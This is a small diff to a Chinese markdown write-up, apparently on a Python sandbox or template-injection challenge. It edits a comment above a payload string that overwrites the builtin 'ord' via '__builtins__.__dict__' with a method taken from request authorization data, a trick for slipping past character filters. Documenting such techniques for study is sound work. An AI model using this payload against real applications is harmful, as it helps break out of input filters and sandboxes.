@@ -51,7 +51,7 @@ for v in ss:
 2. 覆盖ord和设置字符集
 
 ```python
-# 修改 authorization.username
+# 修改 authorization.username = 生成字符集
 cmd = '__builtins__.__dict__[ord.__name__]=request.authorization.username.count'
 ```
 
